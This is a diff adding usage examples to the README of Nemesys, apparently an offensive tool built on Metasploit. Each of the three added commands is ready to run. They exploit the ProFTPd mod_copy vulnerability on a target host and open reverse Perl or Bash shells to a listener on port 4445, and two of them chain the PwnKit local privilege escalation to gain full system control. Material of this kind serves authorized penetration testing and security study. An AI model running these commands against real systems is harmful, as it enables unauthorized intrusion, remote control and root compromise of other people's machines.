@@ -236,6 +236,19 @@ Once everything is set up, you can invoke the **Nemesys** tool using the `nemesy
 
 This command runs an exploit with a specific payload and sets up reverse connections for the exploit to work.
 
+```bash
+sudo $HOME/Desktop/Nemesys-Kali/bin/python nemesys_cli.py \
+  --password "password" \
+  --exploit_name "unix/ftp/proftpd_modcopy_exec" \
+  --payload_name "cmd/unix/reverse_perl" \
+  --rhosts "192.168.11.128" \
+  --sitepath "/var/www/html" \
+  --lhost "192.168.11.129" \
+  --lport 4445 \
+  --privilege_exploit "linux/local/cve_2021_4034_pwnkit_lpe_pkexec" \
+  --target "192.168.11.128"
+```
+
 #### Description 📜:
 - `--password "password"`: The password used for authentication on the target system. 🔑
 - `--exploit_name "unix/ftp/proftpd_modcopy_exec"`: The specific exploit you want to run, targeting a vulnerability in ProFTPd. 📡
@@ -256,6 +269,19 @@ Once you execute the command, **Nemesys** will attempt to exploit the ProFTPd vu
 
 To use a different payload (e.g., `cmd/unix/reverse_bash`), simply modify the `--payload_name` parameter.
 
+```bash
+sudo $HOME/Desktop/Nemesys-Kali/bin/python nemesys_cli.py \
+  --password "password" \
+  --exploit_name "unix/ftp/proftpd_modcopy_exec" \
+  --payload_name "cmd/unix/reverse_bash" \
+  --rhosts "192.168.11.128" \
+  --sitepath "/var/www/html" \
+  --lhost "192.168.11.129" \
+  --lport 4445 \
+  --privilege_exploit "linux/local/cve_2021_4034_pwnkit_lpe_pkexec" \
+  --target "192.168.11.128"
+```
+
 #### Change Explained 🔄:
 - `--payload_name "cmd/unix/reverse_bash"`: Swapping the payload to a Bash reverse shell. 💥
 
@@ -264,6 +290,18 @@ To use a different payload (e.g., `cmd/unix/reverse_bash`), simply modify the `-
 ### 3. Exploiting Without Privilege Escalation 🔓
 
 If you don't need to perform privilege escalation, simply omit the `--privilege_exploit` parameter.
+
+```
+sudo $HOME/Desktop/Nemesys-Kali/bin/python nemesys_cli.py \
+  --password "password" \
+  --exploit_name "unix/ftp/proftpd_modcopy_exec" \
+  --payload_name "cmd/unix/reverse_perl" \
+  --rhosts "192.168.11.128" \
+  --sitepath "/var/www/html" \
+  --lhost "192.168.11.129" \
+  --lport 4445 \
+  --target "192.168.11.128"
+```
 
 #### What Happens? 🔍
 This command will perform the exploit and create a reverse shell without attempting to escalate privileges. It's useful when you only need a foothold without full system control. 💥
